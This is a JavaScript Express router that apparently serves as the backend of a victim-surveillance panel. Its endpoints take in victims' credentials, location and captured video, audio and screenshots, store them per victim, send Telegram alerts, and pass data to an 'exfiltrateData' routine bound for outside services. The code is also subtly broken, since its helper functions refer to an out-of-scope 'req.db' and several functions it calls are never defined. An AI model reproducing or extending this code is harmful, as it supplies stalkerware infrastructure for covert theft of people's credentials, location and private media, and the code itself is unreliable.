hereconst express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');

// Data collection endpoint
router.post('/collect', async (req, res) => {
    try {
        const { victimId, dataType, payload, timestamp } = req.body;
        
        // Validate request
        if (!victimId || !dataType) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        // Get victim from database or create new
        let victim = await getVictim(victimId);
        if (!victim) {
            victim = await createVictim(victimId, req.ip, req.get('User-Agent'));
        }

        // Store data in database
        await storeVictimData(victimId, dataType, payload);

        // Update victim activity
        await updateVictimActivity(victimId);

        // Send Telegram notification for important events
        if (['location', 'media_access', 'credentials', 'scan_complete'].includes(dataType)) {
            sendTelegramNotification(victimId, dataType, payload);
        }

        // Exfiltrate data to external services
        await exfiltrateData(victimId, dataType, payload);

        res.json({ status: 'success', received: true });

    } catch (error) {
        console.error('API collect error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Media upload endpoint
router.post('/media', async (req, res) => {
    try {
        const { victimId, mediaType, data, timestamp } = req.body;
        
        if (!victimId || !mediaType || !data) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        // Create media directory if it doesn't exist
        const mediaDir = path.join(__dirname, '../database/sessions', victimId);
        if (!fs.existsSync(mediaDir)) {
            fs.mkdirSync(mediaDir, { recursive: true });
        }

        // Save media file
        const filename = `${mediaType}_${timestamp}_${Date.now()}.${getFileExtension(mediaType)}`;
        const filepath = path.join(mediaDir, filename);
        
        const buffer = Buffer.from(data, 'base64');
        fs.writeFileSync(filepath, buffer);

        // Store in database
        await storeMediaFile(victimId, mediaType, filepath, buffer.length);

        res.json({ status: 'success', filename: filename });

    } catch (error) {
        console.error('API media error:', error);
        res.status(500).json({ error: 'Media upload failed' });
    }
});

// Victim management endpoints
router.get('/victims', async (req, res) => {
    try {
        const victims = await getActiveVictims();
        res.json({ status: 'success', victims: victims });
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch victims' });
    }
});

router.get('/victim/:id', async (req, res) => {
    try {
        const victim = await getVictim(req.params.id);
        if (!victim) {
            return res.status(404).json({ error: 'Victim not found' });
        }
        res.json({ status: 'success', victim: victim });
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch victim' });
    }
});

// System statistics
router.get('/stats', async (req, res) => {
    try {
        const stats = await getSystemStats();
        res.json({ status: 'success', stats: stats });
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch stats' });
    }
});

// Helper functions
async function getVictim(victimId) {
    return new Promise((resolve, reject) => {
        req.db.get("SELECT * FROM victims WHERE id = ?", [victimId], (err, row) => {
            if (err) reject(err);
            else resolve(row);
        });
    });
}

async function createVictim(victimId, ip, userAgent) {
    return new Promise((resolve, reject) => {
        const geo = getGeoInfo(ip);
        req.db.run(
            `INSERT INTO victims (id, ip, user_agent, country, browser, platform) VALUES (?, ?, ?, ?, ?, ?)`,
            [victimId, ip, userAgent, geo.country, parseBrowser(userAgent), parsePlatform(userAgent)],
            function(err) {
                if (err) reject(err);
                else resolve({ id: victimId });
            }
        );
    });
}

function getFileExtension(mediaType) {
    const extensions = {
        'video': 'webm',
        'audio': 'wav',
        'image': 'jpg',
        'screenshot': 'png'
    };
    return extensions[mediaType] || 'bin';
}

module.exports = router;
